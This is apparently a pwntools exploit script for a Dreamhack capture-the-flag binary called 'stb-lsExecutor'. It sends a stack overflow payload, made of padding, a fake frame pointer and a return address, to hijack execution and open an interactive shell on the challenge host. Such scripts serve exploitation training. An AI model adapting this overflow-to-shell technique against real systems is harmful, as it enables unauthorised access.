#!/usr/bin/env python3

from pwn import *
import ctypes

exe = ELF("./stb-lsExecutor")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host8.dreamhack.games", 19399)

    return r


def main():
    r = conn()

    for i in range(9):
        r.sendafter(b"Enter option : ", b"DUMMY")
        r.sendafter(b"Enter path : ", b"DUMMY")
        r.sendafter(b"Again? y/n", b"Y")

    r.sendafter(b"Enter option : ", b"A" * 60)

    payload = b"A" * 48
    payload += p64(exe.symbols["sel"] + 0x70)
    payload += p64(0x4013cb)
    
    r.sendafter(b"Enter path : ", payload)
    r.sendafter(b"Again? y/n", b"sh")

    r.interactive()


if __name__ == "__main__":
    main()